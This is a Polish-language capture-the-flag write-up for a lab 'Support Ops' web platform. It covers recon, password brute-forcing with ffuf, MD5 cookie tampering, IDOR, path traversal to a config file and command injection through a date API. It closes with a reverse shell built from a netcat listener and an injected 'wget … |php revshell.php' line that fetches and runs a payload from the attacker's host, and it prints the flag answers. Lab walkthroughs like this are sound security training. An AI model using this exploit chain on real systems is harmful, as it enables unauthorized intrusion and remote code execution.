---

Przeprowadź test penetracyjny platformy Support Ops, aby wykorzystać luki w zabezpieczeniach i osiągnąć RCE.

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*IF2UpblqD6cnOtezmwJoVA.png)

Wdrożono nową, wewnętrzną **platformę Support Operations Platform,** aby wspomóc zespoły IT i helpdesk. Aplikacja obsługuje zarządzanie użytkownikami, wewnętrzne interfejsy API oraz operacje na poziomie systemu. Jednak bezpieczeństwo nie było priorytetem podczas prac rozwojowych. Kilka funkcji opiera się na danych wprowadzanych przez użytkownika i słabych granicach zaufania.

Musimy przeprowadzić testy penetracyjne platformy i rozszerzyć dostęp, aby uzyskać RCE na serwerze.

Podczas fazy rozpoznania użyłem Nmapa do przeskanowania maszyny docelowej. Pomogło mi to ustalić, które usługi i porty są aktualnie otwarte i działają.

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*LlK6iSaxNHySIk5uBmv4Gg.png)

Kiedy zacząłem analizować maszynę docelową, znalazłem tylko dwie usługi obsługujące SSH i HTTP. Na porcie 80 usługa HTTP hostowała portal pomocy technicznej. Aby zbadać sprawę dokładniej, użyłem DirBustera. Ujawnił on kilka interesujących ścieżek dostępnych na stronie, w tym:

- `/info.php`
- `/skins`
- `/includes`
- `/api.php`
- `/config.php`
- `/dashboard.php`

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*4rr_D2K-1GuE2N0PNErnpQ.png)

W portalu pomocy technicznej ścieżka główna przekierowuje do strony logowania. Po dokładnej analizie strony możemy stwierdzić, że istnieje użytkownik o adresie e-mail help@support.thm. Aby dowiedzieć się hasła, skorzystamy z narzędzia ffuf.

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*yF5jztESMMHRCtjgezsjtQ.png)

Po złamaniu hasła zalogowałem się i zacząłem przeglądać stronę. W sekcji plików cookie aplikacji zauważyłem coś ciekawego – flagę o nazwie isITuser. Wartość nie była zwykłym argumentem prawda/fałsz, ale skrótem MD5. Po zdekodowaniu okazało się, że reprezentuje ona fałsz (fałsz). Spróbowałem więc ją odwrócić. Zamiast fałszu, zastąpiłem ją skrótem MD5 oznaczającym prawdę (true).

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*TzEEI0IAHszE7EFAW7DynA.png)

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*pa1tIHrbmiYeBZvQsIUaeQ.png)

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*Z213ZPFBmSvzCWTWqoMhQg.png)

Na stronie głównej celu zauważyłem nowy punkt końcowy. Przekierował mnie do wewnętrznego interfejsu API użytkownika. Tu zaczęło się robić ciekawie. Aplikacja miała lukę IDOR (Insecure Direct Object Reference). Zmieniając żądanie, mogłem uzyskać dostęp do danych, do których nie powinienem był uzyskać dostępu. W rezultacie znalazłem adres e-mail administratora.

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*fdaU_oyyuf4GdBkQkXJabA.png)

Na początku utknąłem. Próbowałem wielu rzeczy, ale bezskutecznie. Potem postanowiłem pobawić się adresem URL, dodając ../config. Nagle interfejs użytkownika strony się zmienił. Sprawdziłem kod źródłowy tej strony. Na szczęście znalazłem tam hasło główne do portalu pomocy technicznej.

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*Idn_Wx4MaFVugAb5V5kA3g.png)

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*pHtgvyzwBF7gkvNeQ0eqCA.png)

Po wielu nieudanych próbach logowania przy użyciu znalezionego adresu e-mail i hasła zauważyłem coś dziwnego. Logowanie działało dopiero po usunięciu znaku specjalnego „@” z hasła. Dzięki tej zmianie logowanie przebiegło pomyślnie, a my wcieliliśmy się w rolę administratora i odkryliśmy naszą pierwszą flagę już na stronie głównej.

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*CY455KrxyD8BxMCZB8NEQQ.png)

Jaka jest wartość flagi po zalogowaniu się jako **administrator** ?

> THM{JESTEM ADMINEM999}

Podczas testów zauważyłem niewielką zmianę w interfejsie użytkownika – pojawił się nowy widżet czasu. Zaciekawiony, sprawdziłem kod źródłowy i znalazłem fragment kodu PHP, który ujawnił ścieżkę do bazy danych. Wracając do interfejsu użytkownika, zmiana godziny i daty w widżecie wywołała wywołanie API. Kiedy próbowałem wysłać polecenie `ls`, odpowiedź wskazywała, że ​​akceptowane są tylko funkcje daty.

[](https://medium.com/choose?source=promotion_paragraph---post_body_banner_no_hate--333977ef248b---------------------------------------)

Więc poeksperymentowałem, używając operatora potoku, a następnie `ls`. Ku mojemu zaskoczeniu, zadziałało – serwer zwrócił pełną listę plików w tym katalogu.

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*2rtsegtxCZ6iA3p9aIc5ow.png)

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*p_ASREKnLI902MZAPQFg2Q.png)

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*Sz3tx8x1YmNyH7s2FE25_Q.png)

Korzystając ze ścieżki do bazy danych, którą znalazłem wcześniej, sprawdziłem dane logowania administratora. Ku mojemu zaskoczeniu, hasło administratora nie zawierało `@`oczekiwanego znaku. Prawdziwy sukces przyniosła jednak bramka API. Dzięki niej uzyskałem dostęp do flagi przechowywanej w… `/home/ubuntu/user.txt .` Głównym celem tego pokoju jest wyraźne osiągnięcie zdalnego wykonania kodu (RCE) na serwerze, aby uzyskać głębszą kontrolę.

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*db-ipRzYRQCRExq4lu6YXg.png)

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*nxMvWzfcuU_SO2z2DBCtyA.png)

Ostatnim krokiem wyzwania było uzyskanie zdalnego wykonania kodu (RCE) na serwerze docelowym. Oto jak do tego podszedłem.

Najpierw przygotowałem odwrotną powłokę PHP. Jest mnóstwo zasobów online, które pozwalają ją wygenerować, ale kluczem jest jej konfiguracja tak, aby łączyła się z Twoim komputerem. Użyłem swojego adresu IP i wybrałem port 4444. Ze swojej strony uruchomiłem Netcata, aby nasłuchiwał połączenia:

nc  -lvnp  4444

Następnie musiałem dostarczyć ładunek do celu. W tym celu uruchomiłem prosty serwer Pythona, który obsługiwał powłokę:

python  -m  http.server  1234

Następnie, poprzez bramkę API, użyłem `wget`polecenia w treści żądania, aby pobrać powłokę na maszynę docelową. Zaraz potem przesłałem je do PHP w celu wykonania.

sys: data |wget http://adres_IP_twojej_komputera:port/revshell.php|php revshell.php

Po uruchomieniu ładunku mój program nasłuchujący Netcat przechwycił połączenie — i tak oto miałem odwróconą powłokę.

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*HOCBOPZncraA-ADs_LN4fA.png)

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*UGAn7hZPS-JGj1RfrGucxA.png)

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*tCe8o_VikYIY8kGZyaRRtA.png)

Teraz, gdy mamy dostęp do powłoki na komputerze docelowym, wszystko staje się prostsze. Dzięki temu poziomowi kontroli możemy bezpośrednio eksplorować system i docierać do poufnych plików. Z tego miejsca uzyskałem dostęp do dokumentu flagi przechowywanego na komputerze docelowym. Dostęp do powłoki oznaczał, że mogłem go odczytać bez ograniczeń, co dowodzi, że łańcuch eksploatacji działał od początku do końca.

Jaka jest zawartość pliku **/home/ubuntu/user.txt** ?

> THM{GOT_THE_FLAG001}
